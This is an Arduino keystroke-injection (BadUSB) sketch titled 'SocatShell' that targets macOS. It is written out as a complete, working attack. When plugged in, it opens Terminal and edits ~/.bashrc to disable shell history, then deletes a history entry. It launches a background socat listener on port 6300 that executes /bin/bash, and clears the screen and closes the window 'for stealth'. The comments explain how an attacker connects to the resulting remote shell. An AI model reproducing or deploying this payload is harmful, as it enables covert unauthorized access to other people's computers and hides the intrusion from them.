// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script sets up a TCP listener using socat for remote shell access.
  // Proceeds to clear the terminal and minimize the window for stealth.
  // It listens on the specified port (6300)
  // Once this script is executed there will be an open listener on port 6300
  // you will be able to use the command 'socat STDIN TCP:<remote_ip_address>:6300'
  // this will establish a connection to the remote computer on port 6300
  // and you should be able to interact with the remote shell
  // Requirement: i.p. of target MacOs and socat application
  // can install using homebrew 'brew install socat'
  // Title: SocatShell
  // Author: NARSTY
  // Target: MacOS
  // Version: 1.0
  // Category: Recon
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" nohup socat TCP-LISTEN:6300 EXEC:/bin/bash &>/dev/null &");

  delay(2000);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" clear");

  typeKey(KEY_RETURN);

  delay(250);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}